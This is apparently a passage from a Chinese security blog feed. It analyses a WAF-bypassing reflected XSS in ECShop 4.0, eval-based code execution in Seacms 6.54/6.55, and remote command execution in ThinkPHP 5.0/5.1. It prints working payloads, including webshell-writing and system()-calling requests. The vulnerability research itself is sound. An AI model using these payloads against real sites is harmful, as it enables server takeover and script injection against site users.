<p>在用户登入界面的处理代码中，首先变量$action赋值为login进入主体代码，若变量$back_act为空并且请求包中存在REFERER字段，则将REFERER字段中的内容赋值给变量$back_act，这是导致该漏洞的直接原因，对$back_act变量赋值过后传入assign函数进行处理，其中$smarty是模版类cls_template的实例化：/includes/init.php：170行</p>
<p><img src="/2019/03/13/ECShop-4-0%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-6c0758d2cf944031.jpg" alt></p>
<p>所以查看assign函数时跟进到模版类cls_template中查看：/includes/ cls_template.php：70行</p>
<p><img src="/2019/03/13/ECShop-4-0%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-b3b37cd4da498647.jpg" alt></p>
<p>对传入变量名和变量值进行变量注册，我们可以传入非数组数据对$back_act进行变量注册，注册完毕回到user.php代码，继续跟进模版类中的display函数：/includes/ cls_template.php：100行</p>
<p><img src="/2019/03/13/ECShop-4-0%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-694cf27e9ba6dfff.jpg" alt></p>
<p>调用fetch函数进行user_passport.dwt文件的页面显示，也就是显示用户登入页面，其中在user_passport.dwt文件中：</p>
<p><img src="/2019/03/13/ECShop-4-0%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-535f6da968dcc931.jpg" alt></p>
<p>$back_act值被赋值给input标签中的value,所以我们控制了$back_act变量值便可以在html页面中插入js代码。</p>
<p><strong>四、绕过全局Waf触发XSS</strong></p>
<p>Ecshop中定义了全局安全过滤规则，查看代码：/includes/safety.php</p>
<p><img src="/2019/03/13/ECShop-4-0%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-5e182b4b3d983d09.jpg" alt></p>
<p>这个过滤规则比较简单粗暴，利用’on[a-zA-Z]{3,15}’ 过滤了所有的on开头js事件，所以用事件触发是较为困难了，并且&lt;script、alert、eval、data、Javascript等敏感字符，继续查看代码：</p>
<p><img src="/2019/03/13/ECShop-4-0%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-c26e9b6986f24f42.jpg" alt></p>
<p>$back_act的值如果不是数组便传入filter()函数中利用preg_match进行字符校验，这里利用了/i，所以不区分大小写，无法利用大小写的方式进行绕过，不过这里的敏感字符过滤也不全，例如对于弹窗的js函数confirm就可以被利用，所以主要考虑的是如何绕过过滤检测。<br>我利用了HTML的实体编码来进行绕过，在 HTML 中，某些字符是预留的，比如不能使用小于号（&lt;）和大于号（&gt;），这是因为浏览器会误认为它们是标签。如果希望正确地显示预留字符，我们必须在 HTML 源代码中使用字符实体，如需显示小于号，我们必须这样写：&lt; 或 &lt;，其中’&lt; ‘便是小于号（&lt;）的HTML实体编码，并且不仅是 “&lt;””&gt;” 这样的能编码，所有字符均能编码，a-zA-Z的HTML实体编码方式是&amp;#[字符ACCII编码]，例如a-&gt;&amp;#97。</p>
<p>所以可以利用这一编码方式进行构造POC：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">Referer: [<span class="string">https://127.0.0.1</span>](<span class="link">https://127.0.0.1</span>)"/&gt;<span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">j&amp;#97v&amp;#97script:&amp;#97lert(</span>'<span class="attr">Cyc1e_test</span>')&gt;</span></span><span class="xml"><span class="tag">&lt;<span class="name">imgsrc="xxxxx</span></span></span></span><br></pre></td></tr></table></figure>

<p>其中j&amp;#97v&amp;#97script:&amp;#97lert(‘Cyc1e_test’)可以绕过xss过滤规则的匹配从而绕过服务端的安全过滤植入html页面中，经过html编码解析会恢复成javascript:alert(‘Cyc1e_test’)，从而触发执行，效果如图：</p>
<p><img src="/2019/03/13/ECShop-4-0%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-db65b832df1ea656.jpg" alt></p>
<p>通过点击图片可以直接触发</p>
<p><img src="/2019/03/13/ECShop-4-0%E5%8F%8D%E5%B0%84%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-cf996e66924cb887.jpg" alt></p>
<p>漏洞绕过触发的方式不唯一。</p>
]]></content>
      <categories>
        <category>Cyc1e的漏洞挖掘之路</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>Seacms 6.54 &amp; 6.55 任意代码执行漏洞分析</title>
    <url>/2018/12/20/Seacms-6-54-6-55-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="0x01-漏洞利用方式"><a href="#0x01-漏洞利用方式" class="headerlink" title="0x01. 漏洞利用方式"></a>0x01. 漏洞利用方式</h1><p><strong>6.54版本 POC:</strong></p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//ip:port/search.php</span></span><br><span class="line"></span><br><span class="line">POST：searchtype=<span class="number">5</span><span class="variable">&amp;searchword</span>=&#123;if&#123;searchpage:year&#125;<span class="variable">&amp;year</span>=:e&#123;searchpage:area&#125;&#125;<span class="variable">&amp;area</span>=v&#123;searchpage:letter&#125;<span class="variable">&amp;letter</span>=al&#123;searchpage:lang&#125;<span class="variable">&amp;yuyan</span>=(&#123;searchpage:jq&#125;<span class="variable">&amp;jq</span>=($_P&#123;searchpage:ver&#125;<span class="variable">&amp;ver</span>=OST[Cyc1e]))<span class="variable">&amp;</span>Cyc1e=phpinfo();</span><br></pre></td></tr></table></figure>

<p><strong>6.55版本 POC:</strong></p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//ip:port/search.php?phpinfo();</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">POST:</span>searchtype=<span class="number">5</span><span class="variable">&amp;searchword</span>=&#123;if&#123;searchpage:year&#125;<span class="variable">&amp;year</span>=:as&#123;searchpage:area&#125;&#125;<span class="variable">&amp;area</span>=s&#123;searchpage:letter&#125;<span class="variable">&amp;letter</span>=ert&#123;searchpage:lang&#125;<span class="variable">&amp;yuyan</span>=($_SE&#123;searchpage:jq&#125;<span class="variable">&amp;jq</span>=RVER&#123;searchpage:ver&#125;&amp;<span class="variable">&amp;ver</span>=[QUERY_STRING]));<span class="comment">/*</span></span><br></pre></td></tr></table></figure>

<h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02. 漏洞分析"></a>0x02. 漏洞分析</h1><h3 id="版本：Seacms-v6-54"><a href="#版本：Seacms-v6-54" class="headerlink" title="版本：Seacms v6.54"></a>版本：Seacms v6.54</h3><p>首先Seacms的外部变量GET、POST提交方式在/include/common.php中进行了申明：</p>
<p><img src="/2018/12/20/Seacms-6-54-6-55-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-4a4c77ead54ca2da.png" alt></p>
<p>所以在提交外部变量时可以通过GET方式、也可以通过POST方式。漏洞的入口点在于search.php中的变量$content，其中变量$searchword会传递进入$content且可控，$searchword分别经过RemoveXSS()函数和cn_substr()的处理，定位变量$searchword：search.php：16行</p>
<p><img src="/2018/12/20/Seacms-6-54-6-55-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-cc76060de0e5abff.png" alt></p>
<p>查看第一层处理函数RemoveXSS()：/include/common.func.php：1657行<br><img src="/2018/12/20/Seacms-6-54-6-55-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-bcc02bb9c8dc98bc.png" alt></p>
<p>可以看出RemoveXSS()函数对变量$searchword进行XSS过滤，避免被XSS攻击，随后调用函数cn_substr()对变量$searchword进行处理定位查看：/include/common.func.php：124行<br><img src="/2018/12/20/Seacms-6-54-6-55-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-752aa29d80eee103.png" alt></p>
<p>函数cn_substr()对变量$searchword进行字符长度限制，限制字符长度不超过20，初步的两层处理视乎让人感觉变量$searchword相对比较安全，我们继续跟进，$searchword随后根据程序流将传入echoSearchPage()，在执行echoSearchPage()之前，有一个判断语句：search.php：56行<br><img src="/2018/12/20/Seacms-6-54-6-55-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-b9878fc394edfc9f.png" alt></p>
<p>所以在构造Payload时需要给变量$searchtype赋值为‘5’，才能够继续执行程序流，变量$searchword随后传递进入变量$content中，并且进行了多次的str_replace替换处理：search.php：159行<br><img src="/2018/12/20/Seacms-6-54-6-55-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-fff28fd8fe14389e.png" alt></p>
<p>多次替换处理变量$content后，将其传入parseIf()中</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$content</span>=<span class="variable">$mainClassObj</span>-&gt;parseIf(<span class="variable">$content</span>);<span class="regexp">//search</span>.php：<span class="number">216</span>行</span><br></pre></td></tr></table></figure>

<p>跟进查看函数parseIf():/include/main.class.php：3149行<br><img src="/2018/12/20/Seacms-6-54-6-55-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-f3c3abce2e544d9d.png" alt></p>
<p>变量$labelRule、$labelRule2、$labelRule3定义了正则规则，通过preg_match_all将$content进行正则匹配，即匹配出‘{if:’和‘{end if}’中的字符串，并将匹配的结果传入到$iar中，随后将数组$iar[1][$m]中的字符赋值给变量$strIf,并在最终的条件判断中传入eval()函数<code>@eval(&quot;if(&quot;.$strIf.&quot;) { \$ifFlag=true;} else{ \$ifFlag=false;}&quot;);</code><br>所以如果变量$strIf的值可以恶意构造，那么就可以将恶意代码传入eval()并执行，这也是漏洞的主要，所里整个漏洞利用链在于:<br>$searchword-&gt;$content-&gt;parseIf($content)-&gt;preg_match_all()-&gt;$iar-&gt;$strIf-&gt;eval()。</p>
<p>构造POC：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="attribute">searchtype</span>=5&amp;searchword=&#123;<span class="keyword">if</span>&#123;searchpage:year&#125;&amp;<span class="attribute">year</span>=:e&#123;searchpage:area&#125;&#125;&amp;<span class="attribute">area</span>=v&#123;searchpage:letter&#125;&amp;<span class="attribute">letter</span>=al&#123;searchpage:lang&#125;&amp;yuyan=(&#123;searchpage:jq&#125;&amp;jq=(<span class="variable">$_P</span>&#123;searchpage:ver&#125;&amp;<span class="attribute">ver</span>=OST[Cyc1e]))&amp;<span class="attribute">Cyc1e</span>=phpinfo();</span><br></pre></td></tr></table></figure>

<p>即其中searchword={if{searchpage:year}可以通过RmoveXSS()的过滤，也可以通过cn_ substr()的20字符的限制， echoSearchPage()对searchpage标签进行多次替换处理处理，最终$content中会包含：eval(($_POST[Cyc1e]))<br><img src="/2018/12/20/Seacms-6-54-6-55-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-ea0396d56f39310c.png" alt></p>
<p>$content传入parseIf()后进行正则匹配处理最终传入变量$strIf，打印变量$strIf查看：<br><img src="/2018/12/20/Seacms-6-54-6-55-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-b0ab3991f63b209c-1583322731483.png" alt></p>
<p>可以看出$content中包含的恶意代码eval(($_POST[Cyc1e]))被传入到变量$strIf中，并最终通过eval()函数达到恶意代码的执行，即通过恶意代码实现任意代码执行。</p>
<h3 id="版本：6-55"><a href="#版本：6-55" class="headerlink" title="版本：6.55"></a>版本：6.55</h3><p>6.55版本针对该漏洞，在parseIf()中添加了一个黑名单：/include/main.class.php：3106<br><img src="/2018/12/20/Seacms-6-54-6-55-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-0eb7b6a9f93ba2cd.png" alt></p>
<p>但是通过search.php中$content构造的恶意代码仍然能正常的传递到parseIf()函数中，即漏洞的利用原来是没有变的，而黑名单只是过滤了一些敏感函数和_GET、_POST、_REQUEST和_COOKIE传参方式，而HTTP中传递参数还有$_SERVER方式，所以构造$searchword时，通过利用$_SERVER来获取变量已然能够达到任意代码执行的目的。构造$searchword（放freebuf中大佬的）:</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="attribute">searchtype</span>=5&amp;searchword=&#123;<span class="keyword">if</span>&#123;searchpage:year&#125;&amp;<span class="attribute">year</span>=:as&#123;searchpage:area&#125;&#125;&amp;<span class="attribute">area</span>=s&#123;searchpage:letter&#125;&amp;<span class="attribute">letter</span>=ert&#123;searchpage:lang&#125;&amp;yuyan=(<span class="variable">$_SE</span>&#123;searchpage:jq&#125;&amp;<span class="attribute">jq</span>=RVER&#123;searchpage:ver&#125;&amp;&amp;ver=[QUERY_STRING]));/*</span><br></pre></td></tr></table></figure>

<p>通过echoSearchPage()中对searchpage标签的替换，$content中包含</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">if(<span class="name">assert</span>($_SERVER[QUERY_STRING]))<span class="comment">;/*</span></span><br></pre></td></tr></table></figure>
<p>通过访问URL：http://[ip]:[port]/search.php?phpinfo();即可触发利用，并且同样可以达到任意代码执行的效果，system()函数的执行方式这里就不多说了。<br><img src="/2018/12/20/Seacms-6-54-6-55-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8418106-3c6ecb3f0255c93c.png" alt></p>
<p><strong>漏洞分析仅用于学习！！！一切实际攻击利用行为概不负责。</strong></p>
]]></content>
      <categories>
        <category>Cyc1e的漏洞分析之路</category>
      </categories>
      <tags>
        <tag>CVE</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>ThinkPHP 5.0 &amp; 5.1远程命令执行漏洞利用分析</title>
    <url>/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="0x01-漏洞利用方式"><a href="#0x01-漏洞利用方式" class="headerlink" title="0x01 漏洞利用方式"></a>0x01 漏洞利用方式</h1><p><strong>5.0版本POC（不唯一）</strong></p>
<blockquote>
<p>命令执行：?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=[系统命令]<br>文件写入：?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][1]=<?php phpinfo();?></p>
</blockquote>
<p><strong>5.1版本POC（不唯一）</strong></p>
<blockquote>
<p>命令执行：?s=index/\think\Request/input&amp;filter=system&amp;data=[系统命令]<br>文件写入：?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=<?php phpinfo();?></p>
</blockquote>
<p>#0x02 漏洞分析<br>版本： Thinkphp v5.1.29（影响版本&lt;5.1.31和&lt;5.0.23）<br>本次分析环境：PHP/7.0.12 + Apache2</p>
<p>ThinkPHP官方在12月9日发布了5.*版本的更新，更新说明“由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞”，所以漏洞的触发在路由调度时,thinkphp中由函数pathinfo()来获取路由，定位函数查看：/thinkphp/library/think/Request.php：678行 </p>
<p><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-7fc1e93a2a0a36d2-1583322083188.jpg" alt="pathinfo"></p>
<p>其中在文件31行定义了var_pathinfo的默认值为s ：</p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="comment">// PATHINFO变量名 用于兼容模式</span></span><br><span class="line"><span class="string">'var_pathinfo'</span>   =&gt; <span class="string">'s'</span></span><br></pre></td></tr></table></figure>
<p>所以当请求报文中以GET形式传入s参数是，则将其值作为pathinfo。全局查找pathinfo()函数的调用情况，可以发现同文件下path函数对其进行调用，定位path()函数查看：/thinkphp/library/think/Request.php：716行<img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-45d43f5b8b9de119.jpg" alt></p>
<p>调用pathinfo()函数获取路由信息，并将返回值赋值给了$this-&gt;path，所以我们可以控制该变量，即path()函数的返回值，继续跟踪path函数的调用情况，定位函数routecheck()：/thinkphp/library/think/App.php：583行</p>
<p><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-6c096399e25f84b7.png" alt></p>
<p>该函数进行路由检测，且将我们可控的$path变量传递到了check()函数中进行处理，定位查看check()函数：/thinkphp/library/think/Route.php：877行<br><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-acfd70f549919220.png" alt></p>
<p>这里我们就可以看出为何官方说明，在开启强制路由的情况下不受该漏洞的影响，如果开启强制路由，则check处理传入的由我们构造的$url变量时会实例化RouteNotFoundException对象，即报出对应的错误。</p>
<p><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-7ce5cfc6d18a20dd.png" alt></p>
<p>而默认路由解析情况下，check()函数实例化了UrlDispatch对象，并将$url传递给了构造函数进行处理，UrlDispatch继承Dispatch，分析其父类Dispatch的构造函数，跟踪查看：library/think/route/Dispatch.php：64行<br><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-8af1effac8ce52c2.png" alt></p>
<p>传入的$dispatch变量值赋值给了$this-&gt;dispatch,全局收索$this-&gt;diapatch的处理情况，最终会传入Url类中的init()函数进行处理，跟踪查看init()函数：/thinkphp/library/think/route/dispatch/Url.php：20行</p>
<p><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-7befd70637eb95d8.png" alt></p>
<p>init()函数调用parseUrl()函数对$this-&gt;diapatch变量进行处理，跟踪查看：/thinkphp/library/think/route/dispatch/Url.php：37行</p>
<p><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-4fc3337a8109beaf.png" alt></p>
<p>ParseUrl()函数又将变量传入到了parseUrlPath()函数中，继续定位查看parseUrlPath()函数：/thinkphp/library/think/route/Rule.php：951行</p>
<p><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-24530b9cc6bcb1b6.png" alt></p>
<p>利用‘/’对$url变量进行分割，且$url的格式为‘模块/控制器/操作’，将$url分割后的值存放在$path变量当中，并返回到parseUrl()函数，最终返回到Url类中init()函数: /thinkphp/library/think/route/dispatch/Url.php：20行</p>
<p><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-7d645035cf4370c4.png" alt></p>
<p>最终分割后封装好的路由信息数组传递到了$result变量中，随后传递到了Module的构造函数进行处理，由于Module的父类也是Dispatch，即将$result值传递给了变量$this-&gt;dispatch，随后调用Module类的init()函数对$this-&gt;dispatch进行处理，定位查看：/thinkphp/library/think/route/dispatch/Module.php：27行<br><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-128ecac19dded730.png" alt></p>
<p>在初始化模块的判断语句中，对$module进行判断，则需要$available的值为true，即需要is_dir($this-&gt;app-&gt;getAppPath() . $module 的判断条件成立，由于默认模块是index，所以入口模块为index，也可以用‘.’进行替换。$this-&gt;dispatch的值最终传递到$this-&gt;controller中，init()函数处理完过后，进入exec()函数，查看函数代码: /thinkphp/library/think/route/dispatch/Module.php：85行<br><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-f480d5d4f6d5690e.png" alt></p>
<p>exec()函数将变量$this-&gt;controller传递给了controller()函数进行处理，继续跟踪controller()进行查看：/thinkphp/library/think/App.php：720行<br><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-99aa7524968a38ab.png" alt></p>
<p>该函数中的$name变量是由我们控制的，随后调用parseModuleAndClass()函数对其进行出来，跟进parseModuleAndClass()函数：/thinkphp/library/think/App.php：641行<img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-07e89c869dad893a.png" alt></p>
<p>当$name中存在’\’时，直接将$name值赋给$class，然后实例化$class，并返回，这里可能有些人不知道为什么会实例化$class，在parseModuleAndClass()函数执行后返回到controller()函数中<br><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-421115b8dd62a04c.png" alt></p>
<p>其中返回了$class变量，所以调用魔术方法<strong>get()函数进行处理，App类是继承于Container的，所以可以去查看Container类中的魔术方法</strong>get（）</p>
<blockquote>
<p>   public function __get($name)<br>     {<br>         return $this-&gt;make($name);<br>     }</p>
</blockquote>
<p>__get()调用了make()函数，跟踪查看：/thinkphp/library/think/Container.php：260行<br><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-4ca3c727765e9aa9.png" alt><br>make()将传入的传入的变量实例化为一个类，即controller()中$name为我们可以控制的值，可以通过构造$name变量来实例化任何一个类，所以我们可以通过构造s=index/\think\class/method来实例化\think\class类并且执行该类的method方法达到控制程序流，由于Rule.php中parseUrlPath()函数中：</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="symbol">$url</span> = str_replace(<span class="string">'|'</span>, <span class="string">'/'</span>, <span class="symbol">$url</span>);</span><br></pre></td></tr></table></figure>

<p>所以也可以使用’|’进行进行构造，即index|\think\class|method。在\think\Request类中找到可以利用的方法input:<br><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-1f04a555594188ec.png" alt></p>
<p>通过构造payload：</p>
<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line">s=<span class="meta">index</span>/\think\Request/<span class="meta">input</span><span class="variable">&amp;filter</span>=phpinfo<span class="variable">&amp;data</span>=1</span><br></pre></td></tr></table></figure>
<p>即可调用phpinfo函数，调用system()函数便可以任意命令执行。<br><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-0b758b746098057e.png" alt></p>
<p>在\think\template\driver\file类中找到可以任意写文件的方法write:<br><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-ccdb8cfa53ac94f7.png" alt></p>
<p>所以通过构造payload：</p>
<figure class="highlight sas"><table><tr><td class="code"><pre><span class="line">?s=<span class="meta">index</span>/\think\template\driver\<span class="meta">file</span>/write<span class="variable">&amp;cacheFile</span>=shell.php<span class="variable">&amp;content</span>=&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-38f8d87c894429d4.png" alt></p>
<p>便可以在网站根目录写入任意恶意文件，从而达到控制目标服务器的目的，可以调用进行恶意操作的类比较多。</p>
<p>对于Thinkphp5.0版本的，其路由控制器实现原理是一样的，只是各种调用方式和函数名不太相同，这里不详细分析，漏洞利用时调用的方法不一样，通过查找可以利用app类中的invokeFunction方法：<img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-2a47a46b95e5af6b.png" alt></p>
<p>通过实例化ReflectionFunction类，调用function函数，由于变量$var为数组，所以可以构造payload：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">?s=index/\think\app/invokefunction&amp;function=call<span class="emphasis">_user_</span>func_array&amp;vars[<span class="string">0</span>]=phpinfo&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=1</span><br></pre></td></tr></table></figure>
<p><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-b7e6f442b42a7dac.png" alt></p>
<p>通过构造payload:</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">?s=index/\think\app/invokefunction&amp;function=call<span class="emphasis">_user_</span>func<span class="emphasis">_array&amp;vars[0]=file_</span>put_contents&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=shell.php&amp;vars[<span class="string">1</span>][<span class="symbol">1</span>]=<span class="xml"><span class="php"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span></span></span><br></pre></td></tr></table></figure>
<p>便可以达到任意写的目的：<br><img src="/2018/12/13/ThinkPHP-5-0-5-1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/8418106-28e6c65aa5f32ad0.png" alt></p>
<p>同5.1版本一样，其parseUrlPath函数在处理$url时也进行了替换处理：</p>
